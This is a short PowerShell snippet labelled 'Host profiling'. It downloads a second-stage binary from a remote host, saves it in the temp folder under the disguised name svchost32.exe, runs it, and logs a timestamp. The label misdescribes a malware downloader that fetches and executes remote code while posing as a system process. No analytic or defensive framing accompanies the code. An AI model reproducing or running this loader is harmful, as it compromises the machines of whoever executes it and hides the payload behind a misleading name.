
<# Host profiling #> $RemoteUrl = 'http://example.net/cdn/stage2.bin'; $OutputPath = "$env:TEMP\svchost32.exe"; Invoke-WebRequest -Uri $RemoteUrl -OutFile $OutputPath -UseBasicParsing; & $OutputPath; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Set-Location -Path $env:TEMP
